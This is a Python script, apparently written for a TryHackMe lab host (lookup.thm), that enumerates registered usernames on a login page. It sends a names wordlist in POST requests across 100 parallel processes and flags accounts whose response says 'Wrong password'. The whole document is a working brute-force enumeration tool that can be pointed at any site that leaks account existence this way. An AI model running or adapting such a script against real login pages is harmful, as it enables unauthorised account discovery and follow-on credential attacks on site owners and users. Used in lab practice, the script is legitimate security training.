#####################################################################################################################################
#
##This script is used to identify  the registered usernames for a login page by brute-forcing a given wordlist
#It uses post function from request library to check if the username is available if ouput contains "Wrong password" or its similar
#
#####################################################################################################################################

from multiprocessing import Process
import requests

if __name__ == "__main__":
    
    #wordlist to bruteforce attack
    wordlist_path = "/usr/share/seclists/Usernames/Names/names.txt"
    wordlist=[]
    
    #to create an list from the wordlist
    with open(wordlist_path, 'r') as file:
        for line in file:
            username = line.strip()
            wordlist.append(username)
    file.close()
    
    
    words_lenght=len(wordlist)
    
    #how many instance it can try to request the server at a time
    total_threads=100
    
    counter=0
    
    #check each username function
    def attack():
        for i in range(start_index,end_index):
            username=wordlist[i]
            if not username:
                continue
            data = {"username": username,"password": "testpassword"}
            response = requests.post(url="http://lookup.thm/login.php", data=data)
            
            if (("Wrong Password" in response.text)|("Wrong password" in response.text)|("wrong password" in response.text)|("WRONG PASSWORD" in response.text)):
                print(f"\r[*] Found a username! \"{username}\"")
                
            #To check if fail is running for better verbose    
            # else:
            #     print(username,"fail")

    
    
   
    #splitting the wordlist and so no need to pass parameters when calling function for proper parallel processing
    while(counter<total_threads):
        start_index=int(words_lenght/total_threads*(counter))
        end_index=int(words_lenght/total_threads*(counter+1))
        
        #create a process for the attack function with start
        (Process(target=attack)).start()
        
        
        
        counter+=1
        
